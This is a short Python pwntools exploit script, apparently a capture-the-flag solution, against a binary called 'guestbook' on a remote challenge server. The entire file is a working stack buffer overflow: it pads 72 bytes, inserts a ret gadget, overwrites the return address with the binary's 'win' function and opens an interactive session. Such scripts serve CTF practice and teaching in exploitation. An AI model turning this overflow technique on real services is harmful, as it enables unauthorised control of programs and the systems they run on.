#!/usr/bin/env python3
from pwn import *

exe = ELF("guestbook")
context.binary = exe
context.arch = 'amd64'
context.os = 'linux'

OFFSET_TO_RIP = 72
ret_gadget    = 0x40101a

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it", 13514)
    return r

def main():
    r = conn()

    payload = flat(
        b'A' * OFFSET_TO_RIP,
        p64(ret_gadget),
        p64(exe.sym.win),
    )

    r.recvuntil(b"name?\n")
    r.send(payload)
    r.interactive()

if __name__ == "__main__":
    main()
